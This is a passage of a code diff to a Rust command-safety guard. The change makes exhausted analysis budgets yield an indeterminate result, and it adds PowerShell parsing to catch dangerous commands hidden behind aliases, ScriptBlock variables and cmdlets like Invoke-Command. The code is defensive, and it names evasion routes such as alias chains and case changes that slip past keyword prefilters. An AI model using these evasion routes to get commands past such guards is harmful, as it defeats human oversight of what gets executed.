@@ -50,7 +50,10 @@ use crate::context::sanitize_for_pattern_matching;
 use crate::heredoc::{
     ExtractionResult, SkipReason, TriggerResult, check_triggers, extract_content,
 };
-use crate::normalize::{PATH_NORMALIZER, QUOTED_PATH_NORMALIZER, strip_wrapper_prefixes};
+use crate::normalize::{
+    NormalizeTokenKind, PATH_NORMALIZER, QUOTED_PATH_NORMALIZER, ShellDialect, ShellTokenDecoder,
+    ShellTokenRole, strip_wrapper_prefixes, tokenize_for_shell_dialect,
+};
 use crate::packs::{
     PatternSuggestion, REGISTRY, pack_aware_quick_reject, pack_aware_quick_reject_with_normalized,
 };
@@ -397,6 +400,8 @@ pub enum EvaluationDecision {
     Allow,
     /// Command is blocked from executing.
     Deny,
+    /// Safety evaluation did not complete, so execution must not be allowed.
+    Indeterminate,
 }
 
 /// Byte span of a match within the evaluated command string.
@@ -479,9 +484,9 @@ pub struct BranchContext {
 /// Result of evaluating a command.
 #[derive(Debug, Clone)]
 pub struct EvaluationResult {
-    /// The decision (Allow or Deny).
+    /// The decision (Allow, Deny, or Indeterminate).
     pub decision: EvaluationDecision,
-    /// Pattern match information (present when decision is Deny or Warn).
+    /// Pattern match information (present when a rule matched).
     pub pattern_info: Option<PatternMatch>,
     /// Allowlist override information (present when decision is Allow due to allowlist).
     pub allowlist_override: Option<AllowlistOverride>,
@@ -493,6 +498,9 @@ pub struct EvaluationResult {
     pub effective_mode: Option<crate::packs::DecisionMode>,
     /// Whether evaluation skipped deeper analysis due to a deadline overrun.
     pub skipped_due_to_budget: bool,
+    /// Whether the evaluator proved that no enabled-pack keyword was present
+    /// and returned through the bounded quick-reject fast path.
+    pub quick_rejected: bool,
     /// Git branch context (present when branch awareness is enabled).
     pub branch_context: Option<BranchContext>,
     /// Session occurrence snapshot (present when the command matched a pattern).
@@ -515,6 +523,7 @@ impl EvaluationResult {
             allowlist_override: None,
             effective_mode: None,
             skipped_due_to_budget: false,
+            quick_rejected: false,
             branch_context: None,
             session_occurrence: None,
             graduated_response: None,
@@ -522,16 +531,38 @@ impl EvaluationResult {
         }
     }
 
-    /// Create an "allowed" result due to budget exhaustion (fail-open).
+    /// Create an allowed result produced by the bounded keyword quick-reject
+    /// path. This is deliberately distinct from a fully evaluated clean allow
+    /// and from an incomplete budget result so traces never infer provenance
+    /// from the absence of a match.
     #[inline]
     #[must_use]
-    pub const fn allowed_due_to_budget() -> Self {
+    pub const fn allowed_by_quick_reject() -> Self {
         Self {
             decision: EvaluationDecision::Allow,
             pattern_info: None,
             allowlist_override: None,
             effective_mode: None,
+            skipped_due_to_budget: false,
+            quick_rejected: true,
+            branch_context: None,
+            session_occurrence: None,
+            graduated_response: None,
+            bypass_method: None,
+        }
+    }
+
+    /// Create an indeterminate result due to analysis-budget exhaustion.
+    #[inline]
+    #[must_use]
+    pub const fn indeterminate_due_to_budget() -> Self {
+        Self {
+            decision: EvaluationDecision::Indeterminate,
+            pattern_info: None,
+            allowlist_override: None,
+            effective_mode: None,
             skipped_due_to_budget: true,
+            quick_rejected: false,
             branch_context: None,
             session_occurrence: None,
             graduated_response: None,
@@ -559,6 +590,7 @@ impl EvaluationResult {
             allowlist_override: None,
             effective_mode: Some(crate::packs::DecisionMode::Deny),
             skipped_due_to_budget: false,
+            quick_rejected: false,
             branch_context: None,
             session_occurrence: None,
             graduated_response: None,
@@ -586,6 +618,7 @@ impl EvaluationResult {
             allowlist_override: None,
             effective_mode: Some(crate::packs::DecisionMode::Deny),
             skipped_due_to_budget: false,
+            quick_rejected: false,
             branch_context: None,
             session_occurrence: None,
             graduated_response: None,
@@ -614,6 +647,7 @@ impl EvaluationResult {
             allowlist_override: None,
             effective_mode: Some(crate::packs::DecisionMode::Deny),
             skipped_due_to_budget: false,
+            quick_rejected: false,
             branch_context: None,
             session_occurrence: None,
             graduated_response: None,
@@ -641,6 +675,7 @@ impl EvaluationResult {
             allowlist_override: None,
             effective_mode: Some(crate::packs::DecisionMode::Deny),
             skipped_due_to_budget: false,
+            quick_rejected: false,
             branch_context: None,
             session_occurrence: None,
             graduated_response: None,
@@ -675,6 +710,7 @@ impl EvaluationResult {
             allowlist_override: None,
             effective_mode: Some(crate::packs::DecisionMode::Deny),
             skipped_due_to_budget: false,
+            quick_rejected: false,
             branch_context: None,
             session_occurrence: None,
             graduated_response: None,
@@ -709,6 +745,7 @@ impl EvaluationResult {
             allowlist_override: None,
             effective_mode: Some(severity.default_mode()),
             skipped_due_to_budget: false,
+            quick_rejected: false,
             branch_context: None,
             session_occurrence: None,
             graduated_response: None,
@@ -746,6 +783,7 @@ impl EvaluationResult {
             allowlist_override: None,
             effective_mode: Some(severity.default_mode()),
             skipped_due_to_budget: false,
+            quick_rejected: false,
             branch_context: None,
             session_occurrence: None,
             graduated_response: None,
@@ -771,6 +809,7 @@ impl EvaluationResult {
             // Allowlist overrides apply to a matched rule (typically deny-by-default).
             effective_mode: Some(crate::packs::DecisionMode::Deny),
             skipped_due_to_budget: false,
+            quick_rejected: false,
             branch_context: None,
             session_occurrence: None,
             graduated_response: None,
@@ -790,6 +829,13 @@ impl EvaluationResult {
     #[must_use]
     pub fn is_denied(&self) -> bool {
         self.decision == EvaluationDecision::Deny
+    }
+
+    /// Check if safety evaluation could not reach a decision.
+    #[inline]
+    #[must_use]
+    pub fn is_indeterminate(&self) -> bool {
+        self.decision == EvaluationDecision::Indeterminate
     }
 
     /// Get the reason for denial (if denied).
@@ -1265,9 +1311,6 @@ pub fn evaluate_detailed_with_allowlists(
     let heredoc_settings = config.heredoc_settings();
     let compiled_overrides = config.overrides.compile();
 
-    // Track quick-reject status
-    let quick_rejected = pack_aware_quick_reject(command, &enabled_keywords);
-
     // Get normalized command for diagnostics
     let stripped = strip_wrapper_prefixes(command);
     let normalized = crate::normalize::normalize_command(stripped.normalized.as_ref());
@@ -1287,6 +1330,7 @@ pub fn evaluate_detailed_with_allowlists(
         allowlists,
         &heredoc_settings,
     );
+    let quick_rejected = result.quick_rejected;
 
     let evaluation_time_us = start.elapsed().as_micros() as u64;
 
@@ -1373,12 +1417,4250 @@ fn contains_shell_word_obfuscation(command: &str) -> bool {
     command
         .as_bytes()
         .iter()
-        .any(|b| matches!(b, b'\\' | b'\'' | b'"'))
+        .any(|b| matches!(b, b'\\' | b'\'' | b'"' | b'`'))
+}
+
+const MAX_POWERSHELL_VISIBLE_STATEMENTS: usize = 256;
+const MAX_POWERSHELL_VISIBLE_NESTING: usize = 64;
+
+fn push_top_level_powershell_statement<'a>(
+    command: &'a str,
+    start: usize,
+    end: usize,
+    statements: &mut Vec<&'a str>,
+) -> Result<(), ()> {
+    if let Some(statement) = command.get(start..end).map(str::trim) {
+        if !statement.is_empty() {
+            if statements.len() >= MAX_POWERSHELL_VISIBLE_STATEMENTS {
+                return Err(());
+            }
+            statements.push(statement);
+        }
+    }
+    Ok(())
+}
+
+/// Split a submitted PowerShell script only at statement-level operators.
+///
+/// The shell tokenizer intentionally exposes grouping punctuation as separator
+/// tokens, which is useful for command classification but is not a statement
+/// boundary: splitting at `(` would detach the argument to an alias or a
+/// ScriptBlock invocation. This scanner preserves quoted text, here-strings,
+/// comments, and nested `()[]{}` regions and fails closed on malformed or
+/// pathologically deep input.
+fn split_top_level_powershell_statements(command: &str) -> Result<Vec<&str>, ()> {
+    let bytes = command.as_bytes();
+    let mut statements = Vec::new();
+    let mut nesting = Vec::<u8>::new();
+    let mut statement_start = 0usize;
+    let mut index = 0usize;
+
+    while index < bytes.len() {
+        match bytes[index] {
+            b'`' => {
+                if index + 1 >= bytes.len() {
+                    return Err(());
+                }
+                index += if bytes.get(index + 1) == Some(&b'\r')
+                    && bytes.get(index + 2) == Some(&b'\n')
+                {
+                    3
+                } else {
+                    2
+                };
+            }
+            b'\'' => {
+                let mut cursor = index + 1;
+                let mut closed = false;
+                while cursor < bytes.len() {
+                    if bytes[cursor] == b'\'' {
+                        if bytes.get(cursor + 1) == Some(&b'\'') {
+                            cursor += 2;
+                        } else {
+                            cursor += 1;
+                            closed = true;
+                            break;
+                        }
+                    } else {
+                        cursor += 1;
+                    }
+                }
+                if !closed {
+                    return Err(());
+                }
+                index = cursor;
+            }
+            b'"' => {
+                let mut cursor = index + 1;
+                let mut closed = false;
+                while cursor < bytes.len() {
+                    if bytes[cursor] == b'`' {
+                        if cursor + 1 >= bytes.len() {
+                            return Err(());
+                        }
+                        cursor += 2;
+                    } else if bytes[cursor] == b'"' {
+                        cursor += 1;
+                        closed = true;
+                        break;
+                    } else {
+                        cursor += 1;
+                    }
+                }
+                if !closed {
+                    return Err(());
+                }
+                index = cursor;
+            }
+            b'@' if matches!(bytes.get(index + 1), Some(b'\'' | b'"')) => {
+                if let Some((_, _, end)) = powershell_here_string_end(command, index) {
+                    index = end;
+                } else {
+                    index += 1;
+                }
+            }
+            b'<' if bytes.get(index + 1) == Some(&b'#') => {
+                let end = skip_powershell_block_comment(command, index);
+                if end == bytes.len() && !command[index..].ends_with("#>") {
+                    return Err(());
+                }
+                index = end;
+            }
+            b'#' => match powershell_hash_role(bytes, index) {
+                PowerShellHashRole::Comment => {
+                    index = command[index..]
+                        .find(['\r', '\n'])
+                        .map_or(bytes.len(), |offset| index + offset);
+                }
+                PowerShellHashRole::Ambiguous => return Err(()),
+                PowerShellHashRole::Literal => index += 1,
+            },
+            open @ (b'(' | b'[' | b'{') => {
+                if nesting.len() >= MAX_POWERSHELL_VISIBLE_NESTING {
+                    return Err(());
+                }
+                nesting.push(open);
+                index += 1;
+            }
+            close @ (b')' | b']' | b'}') => {
+                let expected = match close {
+                    b')' => b'(',
+                    b']' => b'[',
+                    b'}' => b'{',
+                    _ => unreachable!(),
+                };
+                if nesting.pop() != Some(expected) {
+                    return Err(());
+                }
+                index += 1;
+            }
+            b';' | b'\r' | b'\n' if nesting.is_empty() => {
+                push_top_level_powershell_statement(
+                    command,
+                    statement_start,
+                    index,
+                    &mut statements,
+                )?;
+                if bytes[index] == b'\r' && bytes.get(index + 1) == Some(&b'\n') {
+                    index += 2;
+                } else {
+                    index += 1;
+                }
+                statement_start = index;
+            }
+            b'|' if nesting.is_empty() => {
+                push_top_level_powershell_statement(
+                    command,
+                    statement_start,
+                    index,
+                    &mut statements,
+                )?;
+                index += if matches!(bytes.get(index + 1), Some(b'|' | b'&')) {
+                    2
+                } else {
+                    1
+                };
+                statement_start = index;
+            }
+            b'&' if nesting.is_empty() && bytes.get(index + 1) == Some(&b'&') => {
+                push_top_level_powershell_statement(
+                    command,
+                    statement_start,
+                    index,
+                    &mut statements,
+                )?;
+                index += 2;
+                statement_start = index;
+            }
+            b'&' if nesting.is_empty() => {
+                let preceding = command
+                    .get(statement_start..index)
+                    .map(str::trim_end)
+                    .unwrap_or_default();
+                let is_call_operator = preceding.is_empty()
+                    || preceding
+                        .as_bytes()
+                        .last()
+                        .is_some_and(|byte| matches!(byte, b'=' | b'(' | b'[' | b'{' | b','));
+                if is_call_operator {
+                    index += 1;
+                } else {
+                    push_top_level_powershell_statement(
+                        command,
+                        statement_start,
+                        index,
+                        &mut statements,
+                    )?;
+                    index += 1;
+                    statement_start = index;
+                }
+            }
+            _ => index += 1,
+        }
+    }
+
+    if !nesting.is_empty() {
+        return Err(());
+    }
+    push_top_level_powershell_statement(command, statement_start, bytes.len(), &mut statements)?;
+    Ok(statements)
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+enum VisiblePowerShellAliasTarget {
+    Static(String),
+    Dynamic,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+struct VisiblePowerShellAliasDefinition {
+    name: String,
+    target: VisiblePowerShellAliasTarget,
+}
+
+fn powershell_alias_word_is_dynamic(raw: &str) -> bool {
+    let mut chars = raw.chars().peekable();
+    let mut single = false;
+    let mut double = false;
+    while let Some(character) = chars.next() {
+        match character {
+            '`' if !single => {
+                if chars.next().is_none() {
+                    return true;
+                }
+            }
+            '\'' if !double => {
+                if single && chars.peek() == Some(&'\'') {
+                    chars.next();
+                } else {
+                    single = !single;
+                }
+            }
+            '"' if !single => double = !double,
+            '$' if !single => return true,
+            '@' if !single && !double => return true,
+            _ => {}
+        }
+    }
+    single || double
+}
+
+fn decoded_powershell_segment_words(
+    segment: &str,
+) -> Option<Vec<(String, bool, std::ops::Range<usize>)>> {
+    let tokens = tokenize_for_shell_dialect(segment, ShellDialect::PowerShell);
+    let mut decoder = ShellTokenDecoder::new(ShellDialect::PowerShell);
+    tokens
+        .iter()
+        .filter(|token| token.kind == NormalizeTokenKind::Word)
+        .take(MAX_POWERSHELL_VISIBLE_ALIAS_WORDS + 1)
+        .map(|token| {
+            let raw = token.text(segment)?;
+            let decoded = decoder.decode(raw, ShellTokenRole::Syntax)?;
+            Some((
+                decoded.into_owned(),
+                powershell_alias_word_is_dynamic(raw),
+                token.byte_range.clone(),
+            ))
+        })
+        .collect::<Option<Vec<_>>>()
+}
+
+const MAX_POWERSHELL_VISIBLE_ALIASES: usize = 64;
+const MAX_POWERSHELL_VISIBLE_ALIAS_WORDS: usize = 256;
+const MAX_POWERSHELL_VISIBLE_ALIAS_DEPTH: usize = 16;
+
+fn powershell_alias_parameter(name: &str, candidate: &str) -> bool {
+    let name = name
+        .trim_start_matches('-')
+        .trim_end_matches([':', '='])
+        .to_ascii_lowercase();
+    !name.is_empty() && candidate.starts_with(&name)
+}
+
+fn visible_powershell_alias_definition(
+    words: &[(String, bool, std::ops::Range<usize>)],
+) -> Option<Result<VisiblePowerShellAliasDefinition, ()>> {
+    let (command, command_dynamic, _) = words.first()?;
+    if *command_dynamic
+        || !matches!(
+            command.to_ascii_lowercase().as_str(),
+            "set-alias" | "new-alias" | "sal" | "nal"
+        )
+    {
+        return None;
+    }
+
+    let mut name = None;
+    let mut target = None;
+    let mut positional = 0usize;
+    let mut index = 1usize;
+    while let Some((value, dynamic, _)) = words.get(index) {
+        if value.starts_with('-') && !*dynamic {
+            if powershell_alias_parameter(value, "name")
+                || powershell_alias_parameter(value, "value")
+            {
+                let is_name = powershell_alias_parameter(value, "name");
+                let Some((argument, argument_dynamic, _)) = words.get(index + 1) else {
+                    return Some(Err(()));
+                };
+                if is_name {
+                    name = (!*argument_dynamic).then(|| argument.clone());
+                } else {
+                    target = Some(if *argument_dynamic {
+                        VisiblePowerShellAliasTarget::Dynamic
+                    } else {
+                        VisiblePowerShellAliasTarget::Static(argument.clone())
+                    });
+                }
+                index += 2;
+                continue;
+            }
+            if ["description", "option", "scope"]
+                .iter()
+                .any(|candidate| powershell_alias_parameter(value, candidate))
+            {
+                index = index.checked_add(2)?;
+                continue;
+            }
+            if ["force", "passthru", "whatif", "confirm"]
+                .iter()
+                .any(|candidate| powershell_alias_parameter(value, candidate))
+            {
+                index += 1;
+                continue;
+            }
+            return Some(Err(()));
+        }
+
+        match positional {
+            0 => name = (!*dynamic).then(|| value.clone()),
+            1 => {
+                target = Some(if *dynamic {
+                    VisiblePowerShellAliasTarget::Dynamic
+                } else {
+                    VisiblePowerShellAliasTarget::Static(value.clone())
+                });
+            }
+            _ => {}
+        }
+        positional += 1;
+        index += 1;
+    }
+
+    Some(match (name, target) {
+        (Some(name), Some(target)) if !name.is_empty() => {
+            Ok(VisiblePowerShellAliasDefinition { name, target })
+        }
+        _ => Err(()),
+    })
+}
+
+fn visible_powershell_alias_removal(
+    words: &[(String, bool, std::ops::Range<usize>)],
+) -> Option<Result<String, ()>> {
+    let (command, command_dynamic, _) = words.first()?;
+    if *command_dynamic
+        || !matches!(
+            command.to_ascii_lowercase().as_str(),
+            "remove-alias" | "ral"
+        )
+    {
+        return None;
+    }
+    let mut index = 1usize;
+    while let Some((value, dynamic, _)) = words.get(index) {
+        if !*dynamic && value.starts_with('-') {
+            if powershell_alias_parameter(value, "name") {
+                let Some((name, name_dynamic, _)) = words.get(index + 1) else {
+                    return Some(Err(()));
+                };
+                return Some(
+                    (!*name_dynamic && !name.is_empty())
+                        .then(|| name.clone())
+                        .ok_or(()),
+                );
+            }
+            if powershell_alias_parameter(value, "scope") {
+                index = index.checked_add(2)?;
+                continue;
+            }
+            if ["force", "whatif", "confirm"]
+                .iter()
+                .any(|candidate| powershell_alias_parameter(value, candidate))
+            {
+                index += 1;
+                continue;
+            }
+            return Some(Err(()));
+        }
+        return Some(
+            (!*dynamic && !value.is_empty())
+                .then(|| value.clone())
+                .ok_or(()),
+        );
+    }
+    Some(Err(()))
+}
+
+fn resolve_visible_powershell_alias(
+    aliases: &HashMap<String, VisiblePowerShellAliasTarget>,
+    name: &str,
+) -> Result<Option<String>, ()> {
+    let mut current = name.to_string();
+    let mut resolved_any = false;
+    let mut visited = HashSet::new();
+    for _ in 0..MAX_POWERSHELL_VISIBLE_ALIAS_DEPTH {
+        let lookup_name = current.to_ascii_lowercase();
+        let Some(target) = aliases.get(&lookup_name) else {
+            return Ok(resolved_any.then_some(current));
+        };
+        if !visited.insert(lookup_name) {
+            return Err(());
+        }
+        resolved_any = true;
+        match target {
+            VisiblePowerShellAliasTarget::Static(target) => {
+                if target.is_empty()
+                    || target.chars().any(char::is_whitespace)
+                    || target.contains([';', '|', '&', '(', ')'])
+                {
+                    return Err(());
+                }
+                // Alias lookup is case-insensitive, but the reconstructed command must
+                // retain the target spelling. The keyword prefilter is intentionally
+                // case-sensitive, so lowercasing `Remove-Item` here would bypass its
+                // registered keyword before the Windows filesystem pack could inspect it.
+                current.clone_from(target);
+            }
+            VisiblePowerShellAliasTarget::Dynamic => return Err(()),
+        }
+    }
+    Err(())
+}
+
+#[allow(clippy::too_many_arguments)]
+fn evaluate_visible_powershell_alias_invocations(
+    command: &str,
+    nested_command_depth: usize,
+    enabled_keywords: &[&str],
+    ordered_packs: &[String],
+    keyword_index: Option<&crate::packs::EnabledKeywordIndex>,
+    compiled_overrides: &crate::config::CompiledOverrides,
+    allowlists: &LayeredAllowlist,
+    heredoc_settings: &crate::config::HeredocSettings,
+    allow_once_audit: Option<&crate::pending_exceptions::AllowOnceAuditConfig<'_>>,
+    project_path: Option<&Path>,
+    deadline: Option<&Deadline>,
+    inherited_automated_stdin: bool,
+) -> Option<EvaluationResult> {
+    let lower = command.to_ascii_lowercase();
+    if !lower.contains("alias")
+        && !lower
+            .split(|character: char| !(character.is_ascii_alphanumeric() || character == '-'))
+            .any(|word| matches!(word, "sal" | "nal" | "ral"))
+    {
+        return None;
+    }
+    let segments = match split_top_level_powershell_statements(command) {
+        Ok(segments) => segments,
+        Err(()) => {
+            return Some(EvaluationResult::denied_by_legacy(
+                "A visible PowerShell alias script has syntax that dcg cannot safely segment",
+            ));
+        }
+    };
+    if segments.len() < 2 {
+        return None;
+    }
+
+    let mut aliases = HashMap::<String, VisiblePowerShellAliasTarget>::new();
+    let mut uncertain_state = false;
+    for segment in segments {
+        let words = match decoded_powershell_segment_words(segment) {
+            Some(words) if words.len() <= MAX_POWERSHELL_VISIBLE_ALIAS_WORDS => words,
+            Some(_) | None => {
+                uncertain_state = !aliases.is_empty() || uncertain_state;
+                continue;
+            }
+        };
+        if words.is_empty() {
+            continue;
+        }
+
+        if let Some(definition) = visible_powershell_alias_definition(&words) {
+            match definition {
+                Ok(definition) => {
+                    if aliases.len() >= MAX_POWERSHELL_VISIBLE_ALIASES
+                        && !aliases.contains_key(&definition.name.to_ascii_lowercase())
+                    {
+                        uncertain_state = true;
+                    } else {
+                        aliases.insert(definition.name.to_ascii_lowercase(), definition.target);
+                    }
+                }
+                Err(()) => uncertain_state = true,
+            }
+            continue;
+        }
+
+        if let Some(removal) = visible_powershell_alias_removal(&words) {
+            match removal {
+                Ok(name) => {
+                    aliases.remove(&name.to_ascii_lowercase());
+                }
+                Err(()) => uncertain_state = true,
+            }
+            continue;
+        }
+
+        let (invoked, dynamic, range) = &words[0];
+        if *dynamic {
+            if !aliases.is_empty() || uncertain_state {
+                return Some(EvaluationResult::denied_by_legacy(
+                    "A visible PowerShell alias invocation depends on runtime expansion",
+                ));
+            }
+            continue;
+        }
+        if uncertain_state {
+            return Some(EvaluationResult::denied_by_legacy(
+                "A visible PowerShell alias definition cannot be statically verified before a later command",
+            ));
+        }
+        let resolved = match resolve_visible_powershell_alias(&aliases, invoked) {
+            Ok(Some(target)) => target,
+            Ok(None) => continue,
+            Err(()) => {
+                return Some(EvaluationResult::denied_by_legacy(
+                    "A visible PowerShell alias chain is dynamic, cyclic, or exceeds dcg's analysis limit",
+                ));
+            }
+        };
+        let arguments = segment
+            .get(range.end..)
+            .map(str::trim_start)
+            .unwrap_or_default();
+        let expanded = if arguments.is_empty() {
+            resolved
+        } else {
+            format!("{resolved} {arguments}")
+        };
+        let result = evaluate_command_with_pack_order_deadline_at_path_inner(
+            &expanded,
+            enabled_keywords,
+            ordered_packs,
+            keyword_index,
+            compiled_overrides,
+            allowlists,
+            heredoc_settings,
+            allow_once_audit,
+            project_path,
+            deadline,
+            ShellDialect::PowerShell,
+            nested_command_depth + 1,
+            inherited_automated_stdin,
+        );
+        if result.is_denied() || result.skipped_due_to_budget {
+            return Some(result);
+        }
+    }
+    None
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+enum VisiblePowerShellScriptBlockSource {
+    Static(String),
+    Dynamic,
+}
+
+fn powershell_variable_prefix(expression: &str) -> Option<(String, usize)> {
+    let bytes = expression.as_bytes();
+    if bytes.first() != Some(&b'$') {
+        return None;
+    }
+    if bytes.get(1) == Some(&b'{') {
+        let close = expression.get(2..)?.find('}')? + 2;
+        let name = expression.get(2..close)?;
+        // Braced PowerShell variable names deliberately admit punctuation that
+        // is not legal in the unbraced form (for example `${x-y}`). Keep the
+        // parser bounded by the closing brace, but do not narrow PowerShell's
+        // valid name grammar to identifier characters.
+        if name.is_empty() || name.chars().any(char::is_control) {
+            return None;
+        }
+        return Some((name.to_ascii_lowercase(), close + 1));
+    }
+
+    let mut end = 1usize;
+    while bytes
+        .get(end)
+        .is_some_and(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b':' | b'?'))
+    {
+        end += 1;
+    }
+    (end > 1).then(|| (expression[1..end].to_ascii_lowercase(), end))
+}
+
+fn visible_powershell_scriptblock_assignment(
+    statement: &str,
+) -> Option<(String, VisiblePowerShellScriptBlockSource)> {
+    let mut statement = statement.trim_start();
+    if let Some((type_start, type_end)) = find_powershell_scriptblock_type_literal(statement, 0)
+        && type_start == 0
+    {
+        statement = statement.get(type_end..)?.trim_start();
+    }
+    let (name, variable_end) = powershell_variable_prefix(statement)?;
+    let remainder = statement.get(variable_end..)?.trim_start();
+    let rhs = remainder.strip_prefix('=')?;
+    if rhs.starts_with('=') {
+        return None;
+    }
+    let rhs = rhs.trim_start();
+    let Some((marker_start, marker_end)) = find_powershell_scriptblock_create(rhs, 0) else {
+        return Some((name, VisiblePowerShellScriptBlockSource::Dynamic));
+    };
+    if marker_start != 0 {
+        return Some((name, VisiblePowerShellScriptBlockSource::Dynamic));
+    }
+
+    let mut open = marker_end;
+    while rhs
+        .as_bytes()
+        .get(open)
+        .is_some_and(u8::is_ascii_whitespace)
+    {
+        open += 1;
+    }
+    if rhs.as_bytes().get(open) != Some(&b'(') {
+        return Some((name, VisiblePowerShellScriptBlockSource::Dynamic));
+    }
+    let Ok(close) = find_powershell_subexpression_close(rhs, open + 1) else {
+        return Some((name, VisiblePowerShellScriptBlockSource::Dynamic));
+    };
+    if !rhs[close + 1..].trim().is_empty() {
+        return Some((name, VisiblePowerShellScriptBlockSource::Dynamic));
+    }
+    let source = parse_static_powershell_source(&rhs[open + 1..close])
+        .map(VisiblePowerShellScriptBlockSource::Static)
+        .unwrap_or(VisiblePowerShellScriptBlockSource::Dynamic);
+    Some((name, source))
+}
+
+fn powershell_method_invocation(rest: &str, method: &str) -> bool {
+    rest.get(..method.len())
+        .is_some_and(|candidate| candidate.eq_ignore_ascii_case(method))
+        && rest.as_bytes().get(method.len()) == Some(&b'(')
+}
+
+fn powershell_method_token_invocation(
+    rest: &str,
+    method: &str,
+    tokens: &crate::normalize::NormalizeTokens,
+    token_index: usize,
+    command: &str,
+) -> bool {
+    rest.eq_ignore_ascii_case(method)
+        && tokens.get(token_index + 1).is_some_and(|next| {
+            next.kind == NormalizeTokenKind::Separator
+                && next.byte_range.start == tokens[token_index].byte_range.end
+                && next.text(command).is_some_and(|raw| raw == "(")
+        })
+}
+
+fn powershell_token_at_command_boundary(
+    tokens: &crate::normalize::NormalizeTokens,
+    index: usize,
+    command: &str,
+) -> bool {
+    let Some(previous) = index.checked_sub(1).and_then(|prior| tokens.get(prior)) else {
+        return true;
+    };
+    let Some(raw) = previous.text(command) else {
+        return false;
+    };
+    if previous.kind == NormalizeTokenKind::Separator {
+        return matches!(raw.trim(), ";" | "|" | "|&" | "||" | "&&" | "&" | "(")
+            || raw.contains(['\r', '\n']);
+    }
+
+    // Braces are intentionally retained in raw PowerShell words by the
+    // lightweight tokenizer. A command after an opening block brace is in
+    // executable position even though it is not at the start of the segment.
+    raw.trim_end().ends_with('{')
+}
+
+fn push_exact_powershell_variable(names: &mut Vec<String>, value: &str) {
+    if let Some((name, end)) = powershell_variable_prefix(value)
+        && end == value.len()
+        && !names.contains(&name)
+    {
+        names.push(name);
+    }
+}
+
+fn visible_powershell_scriptblock_invocations(statement: &str) -> Vec<String> {
+    let tokens = tokenize_for_shell_dialect(statement, ShellDialect::PowerShell);
+    let mut names = Vec::new();
+    let mut decoder = ShellTokenDecoder::new(ShellDialect::PowerShell);
+    let mut executable_consumer_seen = false;
+
+    for (index, token) in tokens.iter().enumerate() {
+        let Some(raw) = token.text(statement) else {
+            continue;
+        };
+
+        if token.kind == NormalizeTokenKind::Word {
+            let Some(decoded) = decoder.decode(raw, ShellTokenRole::Syntax) else {
+                continue;
+            };
+            if let Some((name, variable_end)) = powershell_variable_prefix(decoded.as_ref()) {
+                let remainder = decoded.get(variable_end..).unwrap_or_default();
+                let remainder = remainder.strip_prefix('?').unwrap_or(remainder);
+                if powershell_method_token_invocation(
+                    remainder, ".invoke", &tokens, index, statement,
+                ) || powershell_method_token_invocation(
+                    remainder,
+                    ".invokereturnasis",
+                    &tokens,
+                    index,
+                    statement,
+                ) || powershell_method_token_invocation(
+                    remainder,
+                    ".invokewithcontext",
+                    &tokens,
+                    index,
+                    statement,
+                ) {
+                    if !names.contains(&name) {
+                        names.push(name);
+                    }
+                }
+            }
+        }
+
+        let call_operator = token.kind == NormalizeTokenKind::Separator && raw.trim() == "&";
+        let dot_source = token.kind == NormalizeTokenKind::Word && raw == ".";
+        let consumer = token.kind == NormalizeTokenKind::Word
+            && powershell_token_at_command_boundary(&tokens, index, statement)
+            && !raw.starts_with(['\'', '"'])
+            && [
+                "invoke-command",
+                "icm",
+                "start-job",
+                "sajb",
+                "start-threadjob",
+                "foreach-object",
+                "foreach",
+                "%",
+                "where-object",
+                "where",
+                "?",
+            ]
+            .iter()
+            .any(|candidate| powershell_word_equals(raw, candidate));
+        executable_consumer_seen |= consumer;
+        if !call_operator && !dot_source && !consumer {
+            continue;
+        }
+
+        let mut next = index + 1;
+        while let Some(candidate) = tokens.get(next) {
+            let Some(candidate_raw) = candidate.text(statement) else {
+                break;
+            };
+            if candidate.kind == NormalizeTokenKind::Separator && candidate_raw.trim() == "(" {
+                next += 1;
+                continue;
+            }
+            if candidate.kind == NormalizeTokenKind::Word {
+                let mut value_decoder = ShellTokenDecoder::new(ShellDialect::PowerShell);
+                if let Some(value) = value_decoder.decode(candidate_raw, ShellTokenRole::Syntax) {
+                    push_exact_powershell_variable(&mut names, value.as_ref());
+                }
+            }
+            break;
+        }
+    }
+
+    // Named ScriptBlock parameters can occur after other named arguments.
+    if executable_consumer_seen && let Some(words) = decoded_powershell_segment_words(statement) {
+        for pair in words.windows(2) {
+            let (parameter, parameter_dynamic, _) = &pair[0];
+            let (value, _, _) = &pair[1];
+            if !*parameter_dynamic
+                && [
+                    "scriptblock",
+                    "process",
+                    "filterscript",
+                    "initializationscript",
+                    "begin",
+                    "end",
+                    "parallel",
+                    "remainingscripts",
+                ]
+                .iter()
+                .any(|candidate| powershell_alias_parameter(parameter, candidate))
+            {
+                push_exact_powershell_variable(&mut names, value);
+            }
+        }
+    }
+    names
+}
+
+#[allow(clippy::too_many_arguments)]
+fn evaluate_visible_powershell_scriptblock_invocations(
+    command: &str,
+    nested_command_depth: usize,
+    enabled_keywords: &[&str],
+    ordered_packs: &[String],
+    keyword_index: Option<&crate::packs::EnabledKeywordIndex>,
+    compiled_overrides: &crate::config::CompiledOverrides,
+    allowlists: &LayeredAllowlist,
+    heredoc_settings: &crate::config::HeredocSettings,
+    allow_once_audit: Option<&crate::pending_exceptions::AllowOnceAuditConfig<'_>>,
+    project_path: Option<&Path>,
+    deadline: Option<&Deadline>,
+    inherited_automated_stdin: bool,
+) -> Option<EvaluationResult> {
+    find_powershell_scriptblock_create(command, 0)?;
+    let statements = match split_top_level_powershell_statements(command) {
+        Ok(statements) => statements,
+        Err(()) => {
+            return Some(EvaluationResult::denied_by_legacy(
+                "A visible PowerShell ScriptBlock flow has syntax that dcg cannot safely segment",
+            ));
+        }
+    };
+    let mut scriptblocks = HashMap::<String, VisiblePowerShellScriptBlockSource>::new();
+    if statements.len() >= 2 {
+        for statement in statements {
+            if let Some((name, source)) = visible_powershell_scriptblock_assignment(statement) {
+                if scriptblocks.len() >= MAX_POWERSHELL_VISIBLE_ALIASES
+                    && !scriptblocks.contains_key(&name)
+                {
+                    return Some(EvaluationResult::denied_by_legacy(
+                        "PowerShell script creates too many visible ScriptBlock variables for bounded analysis",
+                    ));
+                }
+                scriptblocks.insert(name, source);
+                continue;
+            }
+
+            for name in visible_powershell_scriptblock_invocations(statement) {
+                let Some(source) = scriptblocks.get(&name) else {
+                    continue;
+                };
+                let source = match source {
